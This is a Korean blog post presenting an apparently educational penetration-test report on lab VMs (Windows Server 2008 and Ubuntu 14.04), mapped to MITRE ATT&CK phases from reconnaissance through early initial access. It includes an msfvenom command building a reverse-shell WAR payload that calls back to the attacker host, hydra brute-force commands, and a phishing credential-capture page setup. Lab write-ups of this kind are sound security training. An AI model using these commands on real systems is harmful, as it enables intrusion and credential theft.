---
layout: post
title: "ATT&CK기반 시스템 모의해킹 보고서"
date: 2025-11-12 17:00:00 +0900
categories: [att-ck]
---

## 0. 프로젝트 개요 {#intro}

### 0.0. 프로젝트 목차
- [0. 프로젝트 개요 {#intro}](#0-프로젝트-개요-intro)
  - [0.0. 프로젝트 목차](#00-프로젝트-목차)
  - [0.1. 프로젝트의 목적 및 의의](#01-프로젝트의-목적-및-의의)
  - [0.2. 시스템 구성도 Architecture](#02-시스템-구성도-architecture)
  - [0.3. 가상머신 VM 현황](#03-가상머신-vm-현황)
  - [0.4. 공격 시나리오 개요 ATT\&CK](#04-공격-시나리오-개요-attck)
- [1. 정찰 Reconnaissance](#1-정찰-reconnaissance)
  - [1.1. 포트 및 서비스 스캔 T1595](#11-포트-및-서비스-스캔-t1595)
  - [1.2. 자동화된 취약점 분석 T1592](#12-자동화된-취약점-분석-t1592)
- [2. 자원 개발 Resource Development](#2-자원-개발-resource-development)
- [3. 초기 접근 Initial Access](#3-초기-접근-initial-access)
  - [3.1. Windows Server (10.0.0.31) 공격](#31-windows-server-100031-공격)
    - [3.1.1. FTP(21): 계정 탈취 및 서비스 거부 (MS11-004, T1110.001)](#311-ftp21-계정-탈취-및-서비스-거부-ms11-004-t1110001)
    - [3.1.2. SSH(22): 관리자 계정 탈취 (T1110.001)](#312-ssh22-관리자-계정-탈취-t1110001)
    - [3.1.3. IIS httpd 7.5(80): 서비스 거부(DoS) 공격 (MS15-034, T1499)](#313-iis-httpd-7580-서비스-거부dos-공격-ms15-034-t1499)
    - [3.1.4. SMB(445): MS17-010 (EternalBlue) 공격 (CVE-2017-0144, T1190)](#314-smb445-ms17-010-eternalblue-공격-cve-2017-0144-t1190)
    - [3.1.5. Java RMI(1617): 인증 우회 원격 코드 실행 (T1210)](#315-java-rmi1617-인증-우회-원격-코드-실행-t1210)
    - [3.1.6. Oracle GlassFish 4.0(4848): 관리자 계정 탈취 및 악성 WAR 배포 (T1190, T1078, T1110)](#316-oracle-glassfish-404848-관리자-계정-탈취-및-악성-war-배포-t1190-t1078-t1110)
    - [3.1.7. ManageEngine(8022): 인증 우회 원격 코드 실행 (CVE-2015-8249, T1190)](#317-manageengine8022-인증-우회-원격-코드-실행-cve-2015-8249-t1190)
    - [3.1.8. Apache Tomcat(8282): 관리자 계정 탈취를 통한 RCE (T1078, T1110)](#318-apache-tomcat8282-관리자-계정-탈취를-통한-rce-t1078-t1110)
    - [3.1.9. WebDAV(8585): 임의 파일 업로드를 통한 웹 셸 실행 (T1608.002)](#319-webdav8585-임의-파일-업로드를-통한-웹-셸-실행-t1608002)
    - [3.1.10. Elasticsearch 1.1.1(9200): 원격 코드 실행 (ESA-2015-06, T1190)](#3110-elasticsearch-1119200-원격-코드-실행-esa-2015-06-t1190)
  - [3.2. Ubuntu Server (10.0.0.42) 공격](#32-ubuntu-server-100042-공격)
    - [3.2.1. FTP (21/tcp): 평문 로그인 스니핑을 통한 계정 탈취 (T1040)](#321-ftp-21tcp-평문-로그인-스니핑을-통한-계정-탈취-t1040)
    - [3.2.2. SSH (22/tcp): Brute-Force를 통한 계정 탈취 (T1110.001)](#322-ssh-22tcp-brute-force를-통한-계정-탈취-t1110001)
    - [3.2.3. HTTP (80/tcp): 다중 웹 애플리케이션 취약점 공격](#323-http-80tcp-다중-웹-애플리케이션-취약점-공격)
    - [3.2.4. Samba (445/tcp): "SambaCry" 원격 코드 실행 시도 및 실패 (CVE-2017-7494, T1190)](#324-samba-445tcp-sambacry-원격-코드-실행-시도-및-실패-cve-2017-7494-t1190)
    - [3.2.5. CUPS (631/tcp): Shellshock RCE 시도 실패 및 취약한 암호화 확인](#325-cups-631tcp-shellshock-rce-시도-실패-및-취약한-암호화-확인)
    - [3.2.6. IRC (6697/tcp): UnrealIRCd 백도어 원격 코드 실행 (CVE--2010-2075, T1190)](#326-irc-6697tcp-unrealircd-백도어-원격-코드-실행-cve--2010-2075-t1190)
- [4. 실행 Execution](#4-실행-execution)
- [5. 지속성 확보 Persistence](#5-지속성-확보-persistence)
    - [5.1. Windows Server (10.0.0.31): 예약 작업 및 레지스트리 Run 키 활용](#51-windows-server-100031-예약-작업-및-레지스트리-run-키-활용)
    - [5.2. Ubuntu Server (10.0.0.42): Crontab을 이용한 지속성 확보](#52-ubuntu-server-100042-crontab을-이용한-지속성-확보)
- [6. 권한 상승 Privilege Escalation](#6-권한-상승-privilege-escalation)
- [7. 방어 회피 Defense Evasion](#7-방어-회피-defense-evasion)
- [8. 자격증명 탈취 Credential Access](#8-자격증명-탈취-credential-access)
  - [8.1.1. 서버 자격증명 덤프 T1003](#811-서버-자격증명-덤프-t1003)
  - [8.1.2 Ubuntu Server: Shadow 파일 해시 덤프 (T1003.008)](#812-ubuntu-server-shadow-파일-해시-덤프-t1003008)
  - [8.2. 중간자 공격(MITM)을 통한 클라이언트 자격증명 탈취 T1557](#82-중간자-공격mitm을-통한-클라이언트-자격증명-탈취-t1557)
- [9. 탐색 Discovery](#9-탐색-discovery)
  - [10. 횡적 이동 Lateral Movement](#10-횡적-이동-lateral-movement)
- [11. 정보 수집 Collection](#11-정보-수집-collection)
  - [11.1. Windows Server (10.0.0.31) Flag 분석](#111-windows-server-100031-flag-분석)
    - [11.1.1. Ace of Hearts.jpg (스테가노그래피)](#1111-ace-of-heartsjpg-스테가노그래피)
    - [11.1.2. Three of Spades.txt (XOR 암호화)](#1112-three-of-spadestxt-xor-암호화)
    - [11.1.3. Six of Diamonds.zip (탈취한 자격증명 활용)](#1113-six-of-diamondszip-탈취한-자격증명-활용)
    - [11.1.4. Seven of Hearts.html (Base64 인코딩)](#1114-seven-of-heartshtml-base64-인코딩)
    - [11.1.5. Seven of Spades.pdf (복호화 실패)](#1115-seven-of-spadespdf-복호화-실패)
    - [11.1.6. Ten of Diamonds.png (파일 시그처 복구)](#1116-ten-of-diamondspng-파일-시그처-복구)
    - [11.1.7. Jack of Diamonds.png.lnk (복구 실패)](#1117-jack-of-diamondspnglnk-복구-실패)
    - [11.1.8. Jack of Hearts.docx (OOXML 파일 구조 분석)](#1118-jack-of-heartsdocx-ooxml-파일-구조-분석)
    - [11.1.9. Queen of Hearts.frm (분석 실패)](#1119-queen-of-heartsfrm-분석-실패)
    - [11.1.10. King of Hearts (WordPress 디렉터리 은닉)](#11110-king-of-hearts-wordpress-디렉터리-은닉)
    - [11.1.11. King of Clubs.exe (리버스 엔지니어링 실패)](#11111-king-of-clubsexe-리버스-엔지니어링-실패)
  - [11.2. Ubuntu Server (10.0.0.42) Flag 분석](#112-ubuntu-server-100042-flag-분석)
    - [11.2.1. 5\_of\_hearts.png (비표준 메타데이터 태그 분석)](#1121-5_of_heartspng-비표준-메타데이터-태그-분석)
    - [11.2.2. 8\_of\_clubs.png (파일 해시 분석)](#1122-8_of_clubspng-파일-해시-분석)
    - [11.2.3. 10\_of\_spades.png (파일 해시 분석)](#1123-10_of_spadespng-파일-해시-분석)
    - [11.2.4. 10\_of\_clubs.wav (Zlib 압축 데이터 추출)](#1124-10_of_clubswav-zlib-압축-데이터-추출)
- [12. 명령 및 제어 Command \& Control](#12-명령-및-제어-command--control)
- [13. 정보 유출 Exfiltration](#13-정보-유출-exfiltration)
- [14. 영향 Impact](#14-영향-impact)
  - [14.1. 네트워크 서비스 거부 (T1498)](#141-네트워크-서비스-거부-t1498)
  - [14.2. 흔적 제거 (T1070.001)](#142-흔적-제거-t1070001)
- [15. 종합 분석 및 대응 방안 {#conclusion}](#15-종합-분석-및-대응-방안-conclusion)
  - [15.1. 종합 분석: 개별 취약점을 관통하는 구조적 문제점](#151-종합-분석-개별-취약점을-관통하는-구조적-문제점)
  - [15.2. 보안 강화 로드맵: 단계별 개선 방안](#152-보안-강화-로드맵-단계별-개선-방안)
    - [\[긴급\] 즉시 조치 사항 (24시간 내 수행 권고)](#긴급-즉시-조치-사항-24시간-내-수행-권고)
    - [\[중기\] 인프라 방어 강화 (3개월 내 수행 권고)](#중기-인프라-방어-강화-3개월-내-수행-권고)
    - [\[장기\] 지속 가능한 보안 체계 구축 (1년 내 구축 목표)](#장기-지속-가능한-보안-체계-구축-1년-내-구축-목표)

### 0.1. 프로젝트의 목적 및 의의

본 프로젝트는 이론으로 학습한 사이버 보안 지식을 실제와 유사한 가상 환경에 적용하여, 공격자의 관점에서 취약점을 분석하고 모의 해킹을 수행함으로써 실무적인 대응 능력을 함양하는 데 그 목적이 있다. 단순히 개별 취약점을 공격하는 것을 넘어, **정찰 Reconnaissance**부터 **정보 유출 Exfiltration** 및 **시스템 영향 Impact**까지 이어지는 일련의 공격 흐름을 MITRE ATT&CK 프레임워크에 기반하여 체계적으로 재현한다. 이를 통해 방어 전략 수립 시 필요한 '공격자의 사고방식'을 이해하고, 보안 설정의 미비점이 실제 시스템에 어떤 위협으로 작용하는지 명확히 인지하는 것을 목표로 한다.

### 0.2. 시스템 구성도 Architecture

본 모의 해킹은 VMWare Workstation을 이용해 구축한 가상 내부 네트워크 환경에서 수행했다. 공격자(Attacker)와 공격 대상(Target)들은 모두 동일한 `10.0.0.0/24` 서브넷에 위치한다. 이는 외부 경계가 이미 침해되었거나, 내부자에 의한 위협 상황을 가정한 현실적인 시나리오이다. 또한, 내부 클라이언트 PC를 별도로 구성하여 중간자 공격(MITM)과 같은 내부망 확산 공격의 영향을 검증할 수 있도록 설계했다.

### 0.3. 가상머신 VM 현황

| 역할 | 호스트명 | 운영체제 | IP 주소 | 주요 역할/서비스 |
|:---|:---|:---|:---|:---|
| Attacker | Kali | Kali Linux | 10.0.0.32 | 모의 침투 수행, C2 서버 |
| Taget 1 | Metas3_W2k8 | Windows Server 2008 R2 | 10.0.0.31 | SMB, IIS, GlassFish, Tomcat, Jenkins, Elasticsearch 등 |
| Target 2 | Metas3_Ubuntu | Ubuntu 14.04 | 10.0.0.42 | Apache, UnrealIRCd, Samba, CUPS, MySQL 등 |

### 0.4. 공격 시나리오 개요 ATT&CK

본 모의 해킹의 전 과정은 MITRE ATT&CK 프레임워크의 전술(Tactic)을 기반으로 체계적으로 설계하고 수행했다. 이 프레임워크는 실제 공격자들이 사용하는 행위를 표준화한 것으로, 본 보고서는 각 공격 단계를 프레임워크의 전술에 매핑하여 공격 흐름을 명확히 추적한다. 아래 표는 이번 모의 해킹에서 수행한 14단계의 전술과 각 단계별 목표, 그리고 사용된 주요 기술 및 도구를 요약한 것이다.

| ATT&CK 전술 Tactic | 목표 Objective | 주요 기술/도구 (Techniques/Tools) |
| :--- | :--- | :--- |
| **정찰** Reconnaissance | 시스템 정보 및 취약점 식별 | `Nmap` (포트 스캔), `Nessus`, `GVM` (자동 취약점 분석) |
| **자원 개발** Resource Development | 공격에 필요한 자원 준비 | `msfvenom` (페이로드 생성), `John the Ripper (rockyou.txt)` |
| **초기 접근** Initial Access | 시스템 내부 침투 | **`Metasploit`을 이용한 다중 RCE 공격** (MS17-010, UnrealIRCd Backdoor, Elasticsearch RCE, ManageEngine RCE, Java JMX RCE, Drupal RCE, Shellshock), **`Hydra`** (FTP/SSH 계정 탈취) |
| **실행** Execution | 악성 코드 및 명령어 실행 | 웹 셸, Meterpreter, `PowerShell` |
| **지속성 확보** Persistence | 재부팅 후에도 접근 권한 유지 | `schtasks` (예약 작업), `레지스트리 Run 키` |
| **권한 상승** Privilege Escalation | 관리자 권한 획득 | `Jenkins 스크립트 콘솔` 악용 (Windows), **`커널 익스플로잇`** (EOL된 Ubuntu 커널 취약점) |
| **방어 회피** Defense Evasion | 보안 탐지 우회 및 무력화 | `netsh` (방화벽 비활성화), `wevtutil` (로그 삭제) |
| **자격증명 탈취** Credential Access | 계정 정보 및 해시 획득 | `Mimikatz (Kiwi)` (LSASS 덤프), `hashdump`, `Ettercap` |
| **탐색** Discovery | 시스템 및 네트워크 정보 파악 | `ipconfig`, `arp`, `netstat`, `net user` |
| **횡적 이동** Lateral Movement | 내부망 다른 시스템으로 확산 | `SSH` (탈취한 키 사용), `PsExec` |
| **정보 수집** Collection | 목표 데이터(Flag) 수집 및 분석 | `find`, `dir`, `binwalk`, `foremost` |
| **명령 및 제어** Command & Control | 원격 제어 채널 유지 | `Meterpreter (Reverse HTTPS)` |
| **정보 유출** Exfiltration | 획득한 데이터를 외부로 반출 | `Meterpreter download`, `scp` (C2 채널 활용) |
| **영향** Impact | 시스템 가용성 훼손 및 흔적 제거 | `Yersinia` (DHCP Starvation), **`wevtutil` (흔적 제거)** |

* * *
{:.short-rule}

## 1. 정찰 Reconnaissance

공격의 첫 단계인 정찰은 목표 시스템에 대한 정보를 수집하여 공격 가능한 지점, 즉 '공격 표면(Attack Surface)'을 식별하고 이해하는 과정이다. 이 단계에서 수집된 정보의 질과 양이 전체 공격 시나리오의 성공 여부를 좌우한다. 본 모의 침투에서는 네트워크 매핑 도구인 `Nmap`을 이용한 능동적 스캔(Active Scanning)과, 자동화된 취약점 분석 도구인 `Nessus` 및 `GVM`을 활용하여 다층적인 정찰을 수행했다.

### 1.1. 포트 및 서비스 스캔 T1595

*   **기술 분석:** `Nmap`을 사용하여 대상 호스트에서 어떤 포트가 열려 있으며, 각 포트에서 어떤 서비스가 어떤 버전으로 실행되고 있는지, 그리고 운영체제는 무엇인지 파악했다. 모든 포트(`-p-`)를 대상으로 스캔하여 숨겨진 서비스를 놓치지 않았으며, 기본 스크립트 스캔(`-sC`)과 버전 탐지(`-sV`), 운영체제 탐지(`-O`) 옵션을 함께 사용하여 최대한 상세한 정보를 수집했다.

*   **공격 검증:**
    위 옵션을 사용하여 두 대상 서버에 대한 Nmap 스캔을 수행한 결과, 다음과 같은 광범위한 공격 표면이 드러났다.

    *   **Windows Server (10.0.0.31):** FTP(21), SSH(22), Microsoft IIS httpd 7.5(80), `SMB(445)`, Java RMI(1617, 49239), **Ruby on Rails (WEBrick, 3000)**, Oracle GlassFish 4.0(4848, 8080), `Apache Tomcat 8.0.33(8282)`, `Jetty/Jenkins(8484)`, Apache httpd 2.2.21/WebDAV(8585), `Elasticsearch 1.1.1(9200)` 등 매우 다양한 서비스가 활성화되어 있었다. 특히 SMB, IIS, Tomcat, Jenkins, Elasticsearch 등은 과거에 치명적인 원격 코드 실행 취약점이 다수 발견되었던 서비스들이다.
<div class="report-container">
  <a href="/assets/reports/nmap_w2k8.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.1.1.nmap_w2k8.png" alt="Nmap Report w2k8">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>

*   **Ubuntu Server (10.0.0.42):** SSH(6.6.1p1, 22), Apache httpd 2.4.7(80, with Drupal, phpMyAdmin), `Samba 4.3.11(445)`, CUPS 1.7(631), MySQL(3306), **Ruby on Rails (WEBrick, 3500)**, `UnrealIRCd(6697)`, **Jetty 8.1.7(8080)** 등 잠재적 취약점을 포함한 서비스가 다수 식별되었다. 특히 Nmap 스캔 결과 FTP(21) 포트는 닫혀 있었으나, UnrealIRCd, 오래된 버전의 Samba, Drupal 등은 즉각적인 시스템 침투로 이어질 수 있는 심각한 취약점을 내포하고 있을 가능성이 매우 높다.
<div class="report-container">
  <a href="/assets/reports/nmap_ubuntu.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.1.2.nmap_ubuntu.png" alt="Nmap Report ubuntu">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>

*   **영향 분석:** Nmap 스캔 결과는 공격자에게 '공격할 대상 목록'을 제공했다. 이렇게 다양하고 오래된 버전의 서비스가 다수 노출되어 있다는 사실만으로도, 시스템이 보안 패치나 버전 관리가 전혀 이루어지지 않는 '방치된 시스템'일 가능성이 높음을 시사한다. 이 정보는 후속 자동화된 취약점 분석의 핵심 입력 자료로 활용된다.

### 1.2. 자동화된 취약점 분석 T1592

*   **기술 분석:** Nmap 스캔으로 식별된 서비스와 버전 정보를 바탕으로, `Nessus`와 `GVM`이라는 두 개의 자동화된 취약점 스캐너를 사용하여 심층 분석을 수행했다. 이 도구들은 방대한 최신 취약점 데이터베이스(CVE)를 기반으로 대상 서비스에 알려진 보안 결함, 설정 오류, 기본 계정 존재 여부 등을 자동으로 검사하고 위험도를 평가하여 보고해준다.

*   **공격 검증:**
    Nessus와 GVM 스캔 결과, 두 시스템 모두 즉각적인 시스템 제어권 탈취로 이어질 수 있는 심각도 'Critical' 및 'High' 등급의 취약점이 다수 발견되었다. 이는 시스템이 보안 패치 및 기본적인 보안 강화(Hardening) 조치가 전혀 이루어지지 않은 상태임을 증명한다.

*   **Windows Server (10.0.0.31):** Nessus는 **총 81개의 취약점(Critical 7개, High 5개 포함)**을, GVM은 필터링 후 **총 82개의 취약점(High 12개, Medium 37개 포함)**을 발견했다. 두 도구의 결과를 종합한 주요 공격 벡터는 다음과 같다.

    *   `지원되지 않는 운영체제(Unsupported OS)`: Windows Server 2008 R2는 공식 기술 지원이 종료되어 새로운 보안 위협에 매우 취약한 상태이다. (Nessus, **Critical, CVSS 10.0**)
    *   `MS17-010 (EternalBlue)`: SMBv1 프로토콜의 원격 코드 실행 취약점으로, 악성코드 전파 등에 널리 악용되는 치명적인 문제이다. (Nessus/GVM 공통, **High, CVSS 8.1~8.8**)
    *   `ManageEngine Desktop Central 다수 취약점`: 정수 오버플로우, 원격 권한 상승, 인증 없는 파일 업로드(CVE-2015-8249) 등 시스템 제어권을 탈취할 수 있는 다수의 심각한 취약점이 두 스캐너에서 공통으로 발견되었다. (Nessus/GVM 공통, **Critical, CVSS 10.0**)
    *   `Elasticsearch 원격 코드 실행 및 지원 종료`: 구버전 사용으로 인한 원격 코드 실행 취약점(ESA-2015-06 등)이 다수 존재하며, Elasticsearch 1.1.1 버전은 지원이 종료(EOL)되어 보안 업데이트를 받을 수 없는 상태이다. (Nessus/GVM 공통, **Critical, CVSS 9.8~10.0**)
    *   `Apache Tomcat / Axis2의 치명적 취약점`: Apache Axis2 관리자 페이지에 **기본 계정(admin:axis2)으로 로그인이 가능**하며(GVM, **High, CVSS 10.0**), 사용 중인 Tomcat 8.0.33 버전은 지원이 종료(EOL)되었을 뿐만 아니라 다수의 원격 코드 실행(RCE), 서비스 거부(DoS), 정보 노출 취약점이 식별되었다. (GVM, **High, CVSS 9.8 이상 다수**)
    *   `MS15-034 (HTTP.sys 원격 코드 실행)`: IIS 웹 서버의 HTTP.sys 드라이버 처리 방식의 결함으로 인해 인증 없이 원격 코드 실행이 가능한 취약점이다. (GVM, **High, CVSS 10.0**)
    *   `IIS FTP 서비스 원격 코드 실행 (MS11-004)`: 인증되지 않은 사용자가 특수하게 조작된 FTP 명령을 전송하여 원격으로 코드를 실행할 수 있는 취약점이다. (Nessus, **Critical, CVSS 9.8**)
    *   `Java JMX/RMI 설정 오류`: Java JMX 인터페이스가 인증 없이 원격으로 연결 가능하도록 설정되어 있어, 이를 통해 임의의 코드를 실행할 수 있는 심각한 설정 오류가 존재한다. (GVM, **High, CVSS 7.5**)
    *   `취약한 기본 계정 정보 사용`: SSH 및 FTP 서비스에서 `vagrant:vagrant`와 같이 추측하기 쉬운 기본 계정이 사용되고 있어 무단 접근에 매우 취약하다. (GVM, **High, CVSS 7.5~9.8**)
<div class="report-container">
  <a href="/assets/reports/nesus_w2k8_adscan.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.2.1.nessus_w2k8.png" alt="Window Report1">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>
<div class="report-container">
  <a href="/assets/reports/gvm_w2k8_report.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.2.2.gvm_w2k8.png" alt="Window Report2">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>

*   **Ubuntu Server (10.0.0.42):** Nessus는 **총 70개의 취약점(Critical 2개, High 2개 포함)**을, GVM은 필터링 후 **총 18개의 주요 취약점(High 5개, Medium 10개 포함)**을 보고했다. 두 결과를 종합한 주요 공격 벡터는 다음과 같다.
    *   `지원 종료(EOL)된 운영체제`: Nessus와 GVM 모두에서 **CVSS 10.0**의 심각한 문제로 탐지되었다. Ubuntu 14.04.x 버전은 지원이 종료되어 더 이상 보안 업데이트가 제공되지 않으므로, 패치되지 않은 취약점을 통한 공격에 직접적인 원인이 될 수 있다. (Nessus/GVM 공통)
    *   `Drupal 원격 코드 실행(RCE) 및 SQL Injection`: Drupal Coder 모듈에서 발생하는 역직렬화(Deserialization) 취약점으로 인해 **원격 코드 실행**이 가능하며(Nessus, **Critical, CVSS 10.0**), 데이터베이스 API의 SQL Injection(SQLi) 취약점 또한 발견되었다(Nessus, **High, CVSS 7.5**).
    *   `ProFTPD 원격 코드 실행 및 기본 인증 정보 사용`: GVM 스캔 결과, ProFTPD의 'mod_copy' 모듈 취약점으로 인해 인증 없이 파일을 복사할 수 있으며, 이는 **원격 코드 실행**으로 이어질 수 있다(**CVSS 10.0**). 또한, 'vagrant:vagrant'라는 기본 인증 정보를 사용해 FTP 로그인이 가능한 문제도 발견되었다(**CVSS 7.5**). (GVM)
    *   `취약한 SSL/TLS 암호화 및 프로토콜 사용`: HTTPS 서비스(631/tcp)에서 **SWEET32(CVE-2016-2183) 공격에 취약한 구형 3DES 암호화**를 사용하는 문제가 확인되었다(Nessus/GVM 공통, **High, CVSS 7.5**). 또한, 현재는 보안상의 이유로 사용이 중단된 TLS 1.0 및 TLS 1.1 프로토콜을 지원하는 문제도 두 스캐너 모두에서 탐지되었다. (Nessus/GVM 공통)
    *   `SSH 보안 설정 미흡`: 'vagrant:vagrant'라는 **기본 인증 정보**를 통해 SSH 로그인이 가능한 심각한 문제가 발견되었다(GVM, **High, CVSS 9.8**). 이외에도 **안전하지 않은 키 교환(KEX), 호스트 키(ssh-dss), 암호화(CBC 모드) 및 MAC(MD5, 96-bit) 알고리즘**을 다수 지원하는 문제가 두 스캐너에서 공통으로 확인되었다. Nessus는 추가로 **Terrapin 접두사 잘림 취약점(CVE-2023-48795)**도 보고했다. (Nessus/GVM 공통)
    *   `jQuery 교차 사이트 스크립팅(XSS) 및 평문 정보 전송`: 웹 서비스에서 사용 중인 jQuery 구버전으로 인해 **교차 사이트 스크립팅(XSS) 취약점(CVE-2012-6708, CVE-2011-4969)**에 노출되어 있으며(GVM), Drupal 및 phpMyAdmin 로그인 페이지 등에서 민감한 정보를 암호화하지 않은 HTTP를 통해 **평문으로 전송**하는 문제도 발견되었다. (GVM)
<div class="report-container">
  <a href="/assets/reports/nesus_ubuntu_adscan.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.2.3.nessus_ubuntu.png" alt="Ubuntu Report">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>
<div class="report-container">
  <a href="/assets/reports/gvm_ubuntu_report.pdf" target="_blank">
    <figure class="report-thumb">
      <img src="/assets/images/att-ck/1.2.4.gvm_ubuntu.png" alt="Ubuntu Report2">
      <figcaption>클릭 시 전체 결과 화면으로 이동합니다.</figcaption>
    </figure>
  </a>
</div>

*   **영향 분석:** 자동화된 취약점 분석 결과는 공격자에게 단순한 '공격 대상 목록'을 넘어, 각 대상을 공격할 수 있는 구체적인 '무기 목록(Exploit List)'과 공격 성공 확률을 제공한다. 이 단계에서 식별된 'Critical' 및 'High' 등급의 취약점들은 다음 단계인 '초기 접근'의 명확한 로드맵이 되었다.

* * *
{:.short-rule}

## 2. 자원 개발 Resource Development

정찰 단계를 통해 식별된 공격 벡터를 실제로 공격하기 위해 필요한 도구나 페이로드(Payload)를 준비하는 단계이다. 이는 공격의 성공률을 높이고, 탐지를 우회하며, 침투 후 원활한 제어를 보장하기 위한 필수적인 사전 준비 과정이다.

*   **기술 분석:**
    *   **패스워드 사전 활용 (T1110.001: Brute Force: Password Guessing):** 많은 시스템이 여전히 추측하기 쉽거나 널리 사용되는 비밀번호를 사용한다. 공격자는 실제 유출된 비밀번호 수백만 개를 모아놓은 `rockyou.txt`와 같은 대규모 사전 파일을 사용하여 자동화된 무차별 대입 공격의 성공률을 극대화한다.
    *   **악성 페이로드 개발 (T1587.001: Develop Capabilities: Exploits):** 익스플로잇이 성공한 후 공격자가 실제 시스템을 제어할 수 있도록 해주는 코드를 페이로드라고 한다. `msfvenom`은 Metasploit 프레임워크에 포함된 페이로드 생성기로, 다양한 운영체제와 아키텍처에 맞는 맞춤형 페이로드를 생성할 수 있다. 특히 `java/meterpreter/reverse_tcp` 페이로드는 자바 기반 웹 애플리케이션(Tomcat, GlassFish 등)을 공격하는 데 최적화되어 있으며, 성공 시 공격자에게 강력한 원격 제어 기능(파일 시스템 접근, 프로세스 제어, 화면 캡처 등)을 제공하는 Meterpreter 세션을 연결해준다.
    *   **피싱 사이트 구축 (T1566.002: Spearphishing Link):** 네트워크 내부 사용자를 직접 겨냥하기 위해, 신뢰할 수 있는 웹사이트(포털, 사내 시스템 등)를 정교하게 모방한 가짜 로그인 페이지를 제작한다. 이 페이지는 사용자가 입력한 ID와 비밀번호를 가로채어 공격자의 서버에 저장하도록 설계된다.

*   **자원 준비 과정:**
    1.  **패스워드 사전 준비:** Kali Linux에 기본적으로 내장된 `/usr/share/wordlists/rockyou.txt.gz` 파일의 압축을 `gzip -d /usr/share/wordlists/rockyou.txt.gz` 명령으로 해제했다. 이 `rockyou.txt` 파일을 후술할 `hydra`를 이용한 Brute-force 공격에 사용할 준비를 마쳤다.
    2.  **악성 WAR 페이로드 제작:** `msfvenom -p java/meterpreter/reverse_tcp LHOST=10.0.0.32 LPORT=4444 -f war -o shell.war` 명령어를 실행했다.
    3.  **피싱 사이트 제작:** 간단한 HTML/CSS로 유명 포털 사이트의 로그인 페이지를 모방한 `index.html` 파일을 제작했다. 로그인 폼의 `action` 속성은 사용자가 입력한 ID와 비밀번호를 POST 방식으로 수신하여 `log.txt` 파일에 저장하는 간단한 `login.php` 스크립트를 가리키도록 설정했다. 이 파일들을 공격자 PC의 Apache 웹 서버 루트(`/var/www/html/`)에 위치시켰다.

*   **영향 분석:** 이 단계에서 준비된 맞춤형 자원들은 '초기 접근' 및 '자격증명 탈취' 단계의 성공을 위한 핵심 요소이다. 잘 준비된 사전 파일은 Brute-force 공격 시간을 단축시키고, `msfvenom`으로 제작된 페이로드는 안정적인 C2 채널을 보장하며, 정교한 피싱 사이트는 사용자의 의심을 피해 민감한 정보를 탈취할 가능성을 높인다.

* * *
{:.short-rule}

## 3. 초기 접근 Initial Access

정찰 단계에서 식별된 공격 표면과 구체적인 취약점 정보를 바탕으로, 시스템에 대한 최초의 접근 권한(Initial Foothold)을 획득하기 위한 공격을 수행한다. 이 단계의 성공은 외부의 공격자가 내부 시스템의 경계를 넘어 실질적인 제어권을 확보하는 첫걸음이다. 본 보고서에서는 각 대상 시스템별로 발견된 다수의 취약점을 포트 번호 오름차순으로 체계적으로 공략하여, 방어 체계의 여러 약점을 다각적으로 시험했다.

### 3.1. Windows Server (10.0.0.31) 공격

#### 3.1.1. FTP(21): 계정 탈취 및 서비스 거부 (MS11-004, T1110.001)

*   **시나리오 분석:** FTP 서비스는 두 가지 주요 공격 벡터를 가지고 있었다.
    1.  **서비스 거부(DoS):** Nessus 리포트에서 CVSS 9.8점으로 평가된 'MS11-004' 취약점(CVE-2010-3190)은 Microsoft IIS FTP 서비스가 텔넷 IAC(Interpret as Command) 문자가 포함된 특별히 조작된 FTP 명령을 처리하는 방식에 결함이 있어, 인증 없이 원격 서비스 거부 공격을 가능하게 한다.
    2.  **계정 탈취:** GVM 리포트에서 'High' 등급으로 지적된 'FTP Brute Force Logins'는 `hydra`와 같은 도구 및 `rockyou.txt` 사전 파일을 이용해 `vagrant`, `Administrator` 등 일반적인 계정에 대한 무차별 대입 공격으로 자격증명을 탈취하는 시나리오이다.
*   **공격 검증:**
    *   **벡터 1 (서비스 거부):** Nessus 리포트에서 식별된 MS11-004 취약점을 검증하기 위해 Metasploit의 auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof 모듈을 사용하여 서비스 거부 공격을 시도했다. 모듈은 정상적으로 실행되었으나, 공격 후에도 FTP 서비스가 중단되지 않아 실제 익스플로잇에는 실패했음을 확인했다. 이는 대상 시스템에 관련 보안 패치가 적용되었을 가능성을 시사한다.
    *   **벡터 2 (계정 탈취):** `hydra -l vagrant -P /usr/share/wordlists/rockyou.txt 10.0.0.31 ftp` 명령을 통해 `vagrant:vagrant` 계정 정보를 획득하는 데 성공했다.
*   **영향 분석:** FTP 서비스 하나만으로도 **계정 탈취(hydra)**와 **FTP 서비스 중단(Metasploit)**이라는 두 가지 치명적인 공격이 가능했다. 이는 패치 관리 부재와 취약한 암호 정책이 결합되었을 때의 파괴력을 보여주며, 공격자에게 시스템에 접근할 수 있는 경로를 제공하고 서비스 가용성을 해칠 수 있음을 보여준다.

![wftp1](/assets/images/att-ck/3.1.1.1.ftp.png)
![wftp2](/assets/images/att-ck/3.1.1.2.ftp.png)

---

#### 3.1.2. SSH(22): 관리자 계정 탈취 (T1110.001)
*   **시나리오 분석:** GVM 리포트에서 지적한 바와 같이, SSH 서비스는 Brute-force 공격에 노출되어 있다. `hydra` 또는 Metasploit의 `auxiliary/scanner/ssh/ssh_login` 모듈과 `rockyou.txt` 사전을 사용하여 `vagrant` 계정에 대한 사전 대입 공격을 시도했다.
*   **공격 검증:** `hydra -l vagrant -P /usr/share/wordlists/rockyou.txt 10.0.0.31 ssh` 명령을 실행하여 `vagrant:vagrant` 계정 정보를 획득하고, `ssh vagrant@10.0.0.31` 명령으로 원격 접속에 성공했다.
